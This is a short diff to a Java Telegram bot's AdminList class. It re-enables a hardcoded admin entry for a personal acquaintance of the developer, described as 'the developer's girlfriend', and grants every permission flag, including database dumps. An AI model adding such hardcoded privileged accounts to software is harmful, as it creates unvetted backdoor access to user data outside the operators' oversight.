@@ -51,13 +51,14 @@ public class AdminList  extends CommandModule {
                         true, true, true,
                         true, true);
             }
+            {
+                User userTg = new User(914020479, "Polyasha00", "", "");
+                add(userTg, userTg, "Подруга разработчика. Так надо.", true,
+                        true, true, true,
+                        true, true);
+            }
         }
-//        {
-//            User userTg = new User(914020479, "Polyasha00", "", "");
-//            add(userTg, userTg, "Подруга разработчика. Так надо.", true,
-//                    true, true, true,
-//                    true, true);
-//        }
+
     }
 
     public void add(User userToAdd, User responsible, String comment, boolean allowDatabaseDump,
